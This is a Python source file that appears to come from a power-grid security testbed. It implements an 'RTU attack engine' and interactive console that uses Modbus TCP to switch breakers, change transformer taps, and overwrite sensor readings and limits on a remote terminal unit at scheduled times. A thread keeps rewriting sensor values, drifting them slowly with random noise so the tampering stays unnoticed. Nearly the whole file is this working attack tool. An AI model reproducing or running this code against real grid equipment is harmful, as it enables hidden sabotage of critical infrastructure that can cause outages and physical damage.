# First prototype for a console application that is able to
# manipulate parts of the grid (e.g. transformers, switches etc.).

from pymodbus3.client.sync import ModbusTcpClient as ModbusClient
from pymodbus3.payload import BinaryPayloadDecoder
from pymodbus3.payload import BinaryPayloadBuilder
from pymodbus3.constants import Endian
from pymodbus3 import exceptions
from rtu_config_parser import RTUConfigParser
from threading import Lock
import _thread
from random import random
from datetime import datetime, timedelta
import time

# Add logging module and set its basic config
import logging
logging.basicConfig(format='%(levelname)s:%(name)s: %(message)s')

# Set to True to test the attack engine by launching it as a console application.
TEST_ATTACK_ENGINE = True

# Define read & write commands
read_commands = ('read_trafo', 'read_switch', 'read_volt_sensor', 'read_max_volt',
                 'read_current_sensor', 'read_max_current')
write_commands = ('write_trafo', 'write_switch', 'write_volt_sensor', 'write_max_volt',
                  'write_current_sensor', 'write_max_current')


class LostConnectionException(Exception):
    """Connection error for the attack engine.
    Attributes:
        message -- explanation of the error
    """
    def __init__(self, message="Lost connection to rtu."):
        self.message = message
        super().__init__(self.message)


class RTUAttackEngine:
    """An attack engine that is able to manipulate grid elements (e.g. transformers, switches etc.) of a RTU."""

    ####################################################################################
    # Constructor
    ####################################################################################

    def __init__(self, config_file):
        """Initialize the attack engine by passing the client and parser for the respective RTU."""
        # Initialize sensor threads & mutex
        self.voltage_sensor_threads = {}  # array of mutexes to stop the thread which is overwriting the sensor
        self.current_sensor_threads = {}  # array of mutexes to stop the thread which is overwriting the sensor
        # use mutex to write to the server or read from it not simultaneously (block the client)
        self.read_write_mutex = Lock()

        # Initialize a logger for errors of the attack engine.
        self.logger = logging.getLogger(__name__)
        self.logger.setLevel(logging.ERROR)

        # Initialize parser & client from given config file
        self.parser = RTUConfigParser(config_file)
        self.client = ModbusClient(self.parser.ip, self.parser.port)
        self.client.connect()

        for i in range(len(self.get_current_sensors())):
            self.current_sensor_threads[self.get_current_sensors()[i]['index']] = [Lock(), Lock()]
            self.current_sensor_threads[self.get_current_sensors()[i]['index']][0].acquire()

        for i in range(len(self.get_voltage_sensors())):
            self.voltage_sensor_threads[self.get_voltage_sensors()[i]['index']] = [Lock(), Lock()]
            self.voltage_sensor_threads[self.get_voltage_sensors()[i]['index']][0].acquire()

    def __del__(self):
        self.client.close()

    ####################################################################################
    # Function for executing commands on the terminal
    ####################################################################################

    def execute_command(self, *args):
        
        """Executes a command on the attack engine."""
        # Give back an error if no command is passed.
        if len(args) == 0:
            self.logger.error("No command passed!")
            return

        if len(args) == 1:
            args = args[0].split(" ")
        
        # Read commands
        if args[0] in read_commands:
            # Try to get the element number from the passed arguments.
            element_number = self._get_element_number(args)

            # Only proceed if an element number was returned.
            if element_number is not None:
                if args[0] == read_commands[0]:  # read_trafo
                    self.read_trafo(element_number)
                elif args[0] == read_commands[1]:  # read_switch
                    self.read_switch(element_number)
                elif args[0] == read_commands[2]:  # read_volt_sensor
                    self.read_volt_sensor(element_number)
                elif args[0] == read_commands[3]:  # read_max_volt
                    self.read_max_volt(element_number)
                elif args[0] == read_commands[4]:  # read_current_sensor
                    self.read_current_sensor(element_number)
                elif args[0] == read_commands[5]:  # read_max_current
                    self.read_max_current(element_number)
                else:
                    raise Exception("This should not happen....")
        # Write commands
        elif args[0] in write_commands:
            # Try to get the element number and new value from the passed arguments.
            element_number = self._get_element_number(args)
            new_value = self._get_new_value(args)

            # Set datetime if it is present.
            start_datetime = datetime.now()
            if len(args) == 4:
                start_datetime = args[3]

            # Only proceed if an element number and new value were returned.
            if element_number is not None and new_value is not None:
                if args[0] == write_commands[0]:  # write_trafo
                    self.write_trafo(element_number, new_value, start_datetime)
                elif args[0] == write_commands[1]:  # write_switch
                    self.write_switch(element_number, new_value, start_datetime)
                elif args[0] == write_commands[2]:  # write_volt_sensor
                    self.write_volt_sensor(element_number, new_value, start_datetime)
                elif args[0] == write_commands[3]:  # write_max_volt
                    self.write_max_volt(element_number, new_value, start_datetime)
                elif args[0] == write_commands[4]:  # write_current_sensor
                    self.write_current_sensor(element_number, new_value, start_datetime)
                elif args[0] == write_commands[5]:  # write_max_current
                    self.write_max_current(element_number, new_value, start_datetime)
                else:
                    raise Exception("This should not happen....")
        # In all other cases, the command is invalid.
        else:
            self.logger.error(f"Command {args[0]} is invalid!")

    ####################################################################################
    # Read & write functions for grid elements
    ####################################################################################

    def read_trafo(self, element_number):
        """Reads the value of a transformer tap."""
        return self._read_value(self.get_transformers(), "tap-transformer", element_number)

    def read_switch(self, element_number):
        """Reads the value of a switch."""
        return self._read_value(self.get_switches(), "switch", element_number, "coil")

    def read_volt_sensor(self, element_number):
        """Reads the value of a voltage sensor."""
        return self._read_value(self.get_voltage_sensors(), "sensor", element_number)

    def read_max_volt(self, element_number):
        """Reads the max value of a voltage sensor."""
        return self._read_value(self.get_voltage_sensors(), "max_voltage", element_number)

    def read_current_sensor(self, element_number):
        """Reads the value of a current sensor."""
        return self._read_value(self.get_current_sensors(), "sensor", element_number)

    def read_max_current(self, element_number):
        """Reads the max value of a current sensor."""
        return self._read_value(self.get_current_sensors(), "max_current", element_number)

    def write_trafo(self, element_number, new_value, start_datetime=datetime.now()):
        """Writes a new value for a transformer tap."""
        return self._write_value(self.get_transformers(), "tap-transformer", element_number, new_value,
                                 start_datetime=start_datetime)

    def write_switch(self, element_number, new_value, start_datetime=datetime.now()):
        """Writes a new value for a switch."""
        return self._write_value(self.get_switches(), "switch", element_number, new_value, "coil",
                                 start_datetime=start_datetime)

    def write_volt_sensor(self, element_number, new_value, start_datetime=datetime.now()):
        """Writes a new value for a voltage sensor."""
        return self._write_value(self.get_voltage_sensors(), "sensor", element_number, new_value,
                                 sensor_threads=self.voltage_sensor_threads, start_datetime=start_datetime)

    def write_max_volt(self, element_number, new_value, start_datetime=datetime.now()):
        """Writes a new max value for a voltage sensor."""
        return self._write_value(self.get_voltage_sensors(), "max_voltage", element_number, new_value,
                                 start_datetime=start_datetime)

    def write_current_sensor(self, element_number, new_value, start_datetime=datetime.now()):
        """Writes a new value for a current sensor."""
        return self._write_value(self.get_current_sensors(), "sensor", element_number, new_value,
                                 sensor_threads=self.current_sensor_threads, start_datetime=start_datetime)

    def write_max_current(self, element_number, new_value, start_datetime=datetime.now()):
        """Writes a new max value for a current sensor."""
        return self._write_value(self.get_current_sensors(), "max_current", element_number, new_value,
                                 start_datetime=start_datetime)

    ####################################################################################
    # Internal read & write functions
    ####################################################################################

    def _read_value(self, elements, name, element_number, type_name="register"):
        """Reads the value of a grid element."""
        value = None
        trafo_string = ""

        for element in elements:  # search element in elements with correct name
            # if correct element was found read values, we have two different cases: 
            #   coils
            #   registers
            if element['name'] == (name + "_" + str(element_number)) or \
                    ("max" in name and element['name'] == ("sensor_" + str(element_number))):
                if type_name == "coil":
                    value = self._read_coil(int(element['address']))
                elif type_name == "register":
                    # for registers we have two different cases:
                    #   - max values from sensors (which are registers but because of the object hierarchy we have to
                    #     handle this as different case)
                    #   - other registers
                    if name.startswith('max_'):
                        value = self._read_register(int((element[name])['address']))
                    else:
                        value = self._read_register(int(element['address']))

                    # If the element is a transformer, add the ratio of the transformer tap value to the output.
                    if name == 'tap-transformer':
                        trafo_string = f" (equals ratio of {element['taps'][value]})"
                else:
                    raise Exception("This should not happen....")
        # If no according element was found and therefore the value is still None, the element number was invalid.
        if value is None:
            self._log_invalid_element_number(element_number, name)
        # Otherwise print out and return the read value.
        else:
            print(f"{name.capitalize()} {element_number} has value {value}{trafo_string}")
            return value

    def _write_value(self, elements, name, element_number, value, type_name="register", sensor_threads=None,
                     start_datetime=datetime.now()):
        """Writes a new value for a grid element."""
        element_found = False
        trafo_string = ""

        # Set fourth parameter to datetime
        start_datetime = self._get_start_datetime(start_datetime)
        if start_datetime is None:
            self.logger.error(f"Command is invalid! Datetime or delay is not in the correct format!")
            return -1

        for element in elements:  # search element in elements with correct name
            # if correct element was found read values, we have two different cases: 
            #   coils
            #   registers
            if element['name'] == (name + "_" + str(element_number)) or \
                    ("max" in name and element['name'] == ("sensor_" + str(element_number))):
                element_found = True

                if type_name == "coil":
                    binary_value = (value != 0)
                    _thread.start_new_thread(self._write_coil, (int(element['address']), binary_value),
                                             {'start_datetime': start_datetime})
                    print(f"{name} {element_number} will be changed value to {binary_value} at "
                          f"{start_datetime.strftime('%d/%m/%Y, %H:%M:%S')}")
                elif type_name == "register":
                    # If the element is a transformer, we need to check if the new tap value is valid before changing
                    # it. Plus, if it's valid, we also need to add the ratio of the new tap value to the output.
                    if name == 'tap-transformer':
                        if self._check_transformer_tap(element, value):
                            trafo_string = f" (equals ratio of {element['taps'][value]})"
                        else:
                            return

                    # for registers we have three different cases:
                    #   sensors (the sensors have to be handled in seperate cases,
                    #   because they have to be overwrite permanently using threads)
                    #   max values from sensors (which are registers but
                    #   because of the object hirarchy we have to handle this as different case)
                    #   other registers
                    if name == 'sensor':  
                        _thread.start_new_thread(self._write_register, (int(element['address']), value),
                                                 {'sensor': True, 'element_number': element_number,
                                                  'sensor_threads': sensor_threads, 'start_datetime': start_datetime})
                    elif "max" in name:
                        _thread.start_new_thread(self._write_register, (int((element[name])['address']), value),
                                                 {'start_datetime': start_datetime})
                    else:
                        _thread.start_new_thread(self._write_register, (int(element['address']), value),
                                                 {'start_datetime': start_datetime})
                    print(f"{name} {element_number} will be changed to {value}{trafo_string} at "
                          f"{start_datetime.strftime('%d/%m/%Y, %H:%M:%S')}")
                else:
                    raise Exception("This should not happen....")
        # If no according element was found, the element number was invalid.
        if not element_found:
            self._log_invalid_element_number(element_number, name)

    def _read_register(self, address):
        """Reads the value of a register."""
        count = 4  # the value is in four registers
        self.read_write_mutex.acquire()  # lock mutex to read from client
        try:
            result_registers = self.client.read_holding_registers(address, count)
            decoder = BinaryPayloadDecoder.from_registers(result_registers.registers, endian=Endian.Big)
            result = decoder.decode_64bit_float()
        except exceptions.ModbusIOException as e:
            raise LostConnectionException() from e
        self.read_write_mutex.release()  # unlock mutex
        return result

    def _write_register(self, address, value, sensor=False, element_number=0, sensor_threads=None,
                        start_datetime=datetime.now()):
        """
        Writes a new value into a register. 
        In case of a sensor, this function will write the value all the time.
        In case of other elements like the maximum value of a sensor the writing process is only once.

        address:        register address
        value:          new value of the register
        sensor:         is the register for a sensor
        element_number: the number of the element
        sensor_threads: two dimmensional array of mutexes each sensor has two mutexes
        start_datetime: the datetime when the manipulation has to start (as delay or timestamp) 
        """

        # sleep here till activated
        self._sleep_till_manipulation_start(start_datetime)

        # overwrite value only once if it is not a sensor
        if not sensor: 
            # build payload
            builder = BinaryPayloadBuilder(endian=Endian.Big)
            builder.add_64bit_float(value)
            payload = builder.build()
            # lock mutex to read from client
            self.read_write_mutex.acquire()
            # write payload to address
            try:
                self.client.write_registers(address, payload, skip_encode=True)
            except exceptions.ModbusIOException as e:
                raise LostConnectionException() from e

            # unlock mutex
            self.read_write_mutex.release()
        else: 
            # initialize all variables which we need for hiding manipulation
            counter = 0
            excreeded = 0
            factor = 0.01
            current_value = self._read_register(address)

            # sensor_threads[element_number][0] 
            #   current thread signal writing 
            #   initially acquire
            # sensor_threads[element_number][1]
            #   current thread signal ending
            #   initially release
            sensor_threads[element_number][0].release()  # stop overwriting sensor
            sensor_threads[element_number][1].acquire()  # wait for stop overwriting sensor
            sensor_threads[element_number][0].acquire()  # "block" the sensor which will be overwritten
            
            while True:
                # if there is an other writing command to the same sensor exit this thread
                if not sensor_threads[element_number][0].locked():
                    sensor_threads[element_number][1].release()
                    break

                # increase or decrease value slowly to be silent ;)
                if counter == 1000:  # every 1000 loops we will change the written value
                    counter = 0
                    if value >= current_value:  # increase current value
                        # reduce the factor if:
                        # first condition: if the value was exceeded
                        # second condition: the last four float places are random for fluctuation
                        if excreeded == 1 and factor > 0.00000000001: 
                            excreeded = 0
                            factor *= 0.1
                        current_value += random()*factor
                    elif value < current_value:  # decrease current value
                        # reduce the factor if:
                        # first condition: if the value was fallen below
                        # second condition: the last four float places are random for fluctuation
                        if excreeded == 0 and factor > 0.00000000001:
                            excreeded = 1
                            factor *= 0.1
                        current_value -= random()*factor
                counter += 1
                
                # build payload
                builder = BinaryPayloadBuilder(endian=Endian.Big)
                builder.add_64bit_float(current_value)
                payload = builder.build()
                # lock mutex to write to client
                self.read_write_mutex.acquire()
                # write payload to address
                try:
                    self.client.write_registers(address, payload, skip_encode=True)
                except exceptions.ModbusIOException as e:
                    raise LostConnectionException() from e
                # unlock mutex
                self.read_write_mutex.release() 

    def _read_coil(self, address):
        """Reads the value of a coil."""
        self.read_write_mutex.acquire()  # lock mutex to read from client
        try:
            result = self.client.read_coils(address, count=1, unit=0x1)
        except exceptions.ModbusIOException as e:
            raise LostConnectionException() from e
        self.read_write_mutex.release()  # unlock mutex
        return result.bits[0]

    def _write_coil(self, address, value, start_datetime=datetime.now()):
        """Writes a new value into a coil."""
        self._sleep_till_manipulation_start(start_datetime)  # wait till start datetime
        self.read_write_mutex.acquire()  # lock mutex to read from client
        try:
            self.client.write_coil(address, value, unit=1)
        except exceptions.ModbusIOException as e:
            raise LostConnectionException() from e
        self.read_write_mutex.release()  # unlock mutex

    @staticmethod
    def _sleep_till_manipulation_start(start_datetime):
        """Waits for starting manipulation."""
        while True:
            diff = (start_datetime - datetime.now()).total_seconds()
            if diff < 0:  # In case start_datetime was in past to begin with
                break
            time.sleep(diff/2)
            if diff <= 0.1:
                break

    ####################################################################################
    # Getter functions for parser & grid elements
    ####################################################################################

    def get_parser(self):
        """Returns the used parser."""
        return self.parser

    def get_switches(self):
        """Returns all switches of the RTU from the parser."""
        return self.parser.switches

    def get_transformers(self):
        """Returns all transformers of the RTU from the parser."""
        return self.parser.transformers

    def get_voltage_sensors(self):
        """Returns all voltage sensors of the RTU from the parser."""
        return self.parser.voltage_sensors

    def get_current_sensors(self):
        """Returns all current sensors of the RTU from the parser."""
        return self.parser.current_sensors

    def get_address(self):
        return self.parser.ip + ':' + self.parser.port

    def get_ip(self):
        return self.parser.ip

    def get_port(self):
        return self.parser.port
        
    ####################################################################################
    # Helper functions for validating user input & logging error messages
    ####################################################################################

    def _get_element_number(self, args):
        """Gets the element number from the parameter arguments and converts it to an integer.
        If the argument is missing or has the wrong type, an error is logged and None is returned."""
        try:
            element_number = int(args[1])
            return element_number
        except IndexError:
            self.logger.error(f"Missing second argument (element number) for {args[0]}!")
        except ValueError:
            self.logger.error(f"Invalid type of second argument (element number) for {args[0]}! "
                              f"(must be an integer)")
        return None

    def _get_new_value(self, args):
        """Gets the new value from the parameter arguments and converts it to a float.
        If the argument is missing or has the wrong type, an error is logged and None is returned."""
        try:
            new_value = float(args[2])
            return new_value
        except IndexError:
            self.logger.error(f"Missing third argument (new value) for {args[0]}!")
        except ValueError:
            self.logger.error(f"Invalid type of third argument (new value) for {args[0]}! "
                              f"(must be a float)")
        return None

    def _get_start_datetime(self, start_datetime):
        """Gets the start datetime from the parameter arguments and converts it to a datetime.
        If the argument is missing it is the current time. If the argument has the wrong type,
        an error is logged and None is returned."""
        try:
            # If it is already a datetime everything is fine
            if isinstance(start_datetime, datetime):
                datetime_object = start_datetime
            # If start datetime is int it represents an delay in seconds
            elif isinstance(start_datetime, int):
                datetime_object = datetime.now() + timedelta(seconds=start_datetime)
            # If start datetime is string and digit it represents an delay in seconds    
            elif start_datetime.isdigit():
                datetime_object = datetime.now() + timedelta(seconds=int(start_datetime))
            # Otherwise try to format it into a datetime
            else:
                datetime_object = datetime.strptime(start_datetime, "%d/%m/%Y_%H:%M:%S")
            return datetime_object
        except IndexError:
            return datetime.now()
        except ValueError:
            self.logger.error(f"Invalid type of fourth argument (starting time)! "
                              f"(must be a datetime or int)")
        return None

    def _check_transformer_tap(self, transformer, tap_value):
        """Checks whether the passed new transformer tap value is valid.
        If that's not the case, an error is logged for the user."""
        trafo_taps = transformer['taps']
        ratio = trafo_taps.get(tap_value)
        if ratio is None:
            self.logger.error(f"Tap value {tap_value} invalid for {transformer['name']}! "
                              f"Valid values are: {list(trafo_taps.keys())}")
            return False
        else:
            return True

    def _log_invalid_element_number(self, element_number, name):
        """Logs an according error for indicating that the passed element number is invalid."""
        if name == 'tap-transformer':
            name = 'trafo'
        elif name.startswith('max_'):
            name = 'sensor'
        self.logger.error(f"{name.capitalize()} number {element_number} is invalid!")


def main():
    """Main method for testing the RTU attack engine if activated."""
    if TEST_ATTACK_ENGINE:
        # Print out the starting message
        print("\t=============================================")
        print("\t   ___  __   ___  _______ _____  __  ________")
        print("\t  / _ )/ /  / _ |/ ___/ //_/ _ \\/ / / /_  __/")
        print("\t / _  / /__/ __ / /__/ ,< / // / /_/ / / /   ")
        print("\t/____/____/_/ |_\\___/_/|_|\\___/\\____/ /_/    ")
        print("\n\t=============================================")
        print("\n")
        print("===============================================================")
        print("Simple attack prototype for RTU 1")
        print("===============================================================")

        # Create the client, parser and attack engine.
        test_attack_engine = RTUAttackEngine("seccomm/Testbed/data/config_files/new_rtu_1.xml")

        # Get the lists for all grid elements of the RTU.
        switches = test_attack_engine.get_switches()
        transformers = test_attack_engine.get_transformers()
        voltage_sensors = test_attack_engine.get_voltage_sensors()
        current_sensors = test_attack_engine.get_current_sensors()

        # Print out the commands and available numbers of elements for each type of grid element.
        print("Read value for:")
        print(f"\tSwitch: read_switch [switch_number 1 - {len(switches)}]")
        print(f"\tTransformer: read_trafo [trafo_number 1 - {len(transformers)}]")
        print(f"\tVoltage Sensor: read_volt_sensor [sensor_number 1 - {len(voltage_sensors)}]")
        print(f"\tMaximum Voltage Sensor: read_max_volt [sensor_number 1 - {len(voltage_sensors)}]")
        print(f"\tCurrent Sensor: read_current_sensor [sensor_number 1 - {len(current_sensors)}]")
        print(f"\tMaximum Current Sensor: read_max_current [sensor_number 1 - {len(current_sensors)}]")
        print("===============================================================")
        print("Manipulate value for:")
        print(f"\tSwitch: write_switch [switch_number 1 - {len(switches)}] [value]")
        print(f"\tTransformer: write_trafo [trafo_number 1 - {len(transformers)}] [value]")
        print(f"\tVoltage Sensor: write_volt_sensor [sensor_number 1 - {len(voltage_sensors)}] [value]")
        print(f"\tMaximum Voltage Sensor: write_max_volt [sensor_number 1 - {len(voltage_sensors)}] [value]")
        print(f"\tCurrent Sensor: write_current_sensor [sensor_number 1 - {len(current_sensors)}] [value]")
        print(f"\tMaximum Current Sensor: write_max_current [sensor_number 1 - {len(current_sensors)}] [value]")
        print(f"\n\tIf you want to set a specific start date or time, "
              f"you can append it in the format %d/%m/%y_%H:%M ie.: 01/01/2021_06:30.")
        print(f"\tAlternatively, you can set a delay by appending the number of seconds.")
        print("===============================================================")
        print("\n")

        while True:
            command = input("Please enter your command: ")
            if command == 'quit':
                break
            test_attack_engine.execute_command(command)
            print()


if __name__ == '__main__':
    main()
